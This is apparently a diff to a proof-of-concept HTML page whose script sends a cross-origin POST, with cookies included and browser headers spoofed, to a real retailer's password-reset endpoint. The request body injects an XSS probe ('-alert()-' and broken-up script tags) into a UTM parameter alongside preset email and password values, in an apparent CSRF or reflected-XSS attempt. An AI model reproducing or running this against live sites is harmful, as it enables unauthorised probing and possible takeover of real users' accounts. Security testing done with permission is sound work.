@@ -7,19 +7,43 @@
     <script>
         fetch("https://nz.myprotein.com/passwordReset.account", {
             method: "POST",
+            mode: "cors",  // Attempt CORS if possible
+            credentials: "include", // Include cookies if required
             headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
+                "Host": "nz.myprotein.com",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate, br",
                 "Referer": "https://nz.myprotein.com/",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Content-Length": "233",
                 "Origin": "https://nz.myprotein.com/",
-                "Access-Control-Allow-Origin": "https://nz.myprotein.com/"
+                "Dnt": "1",
+                "Sec-Gpc": "1",
+                "Upgrade-Insecure-Requests": "1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-User": "?1",
+                "Priority": "u=0, i",
+                "Te": "trailers",
+                "Connection": "keep-alive",
+                "Via": "gsz50"
             },
-            body: `resetRequest=1&customerEmail=test@test.com&newPassword=testing123&confirmPassword=testing123&wechatSetPassword=testing123&utm_source=test">'-alert()-'&test">"""<"
+            body: `resetRequest=1&customerEmail=test@test.com&newPassword=testing123&confirmPassword=testing123&wechatSetPassword=testing123&utm_source=test">'-alert()-'&random=randominput
+">"
+"
+"<"
 "scr"ipt"
-"
-"
-a"lert(")""<"
-/script><
-!--//`
+
+    "
+    "
+    a"lert(")"
+
+"<"
+/
+script>`
         });
     </script>
 </body>
